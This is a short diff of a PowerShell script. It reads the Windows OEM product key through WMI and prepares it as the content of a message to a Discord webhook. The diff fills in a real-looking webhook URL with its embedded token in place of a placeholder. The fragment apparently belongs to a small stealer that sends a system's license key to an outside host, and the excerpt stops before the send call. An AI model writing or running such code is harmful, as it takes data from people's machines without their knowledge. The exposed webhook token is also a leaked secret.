@@ -1,5 +1,5 @@
 $Key = (Get-WmiObject -Class SoftwareLicensingService).OA3xOriginalProductKey
-$WebhookURL = "YOUR_DISCORD_WEBHOOK_URL"
+$WebhookURL = "https://discord.com/api/webhooks/1195943234539622420/wX5qZkIJQwgeI_C134DLkvicdxSrc-WhUKtS7VQzptuqh-Jm_QV9l7afjSg_II-c8vnC"
 
 $Body = @{
     'content' = $Key
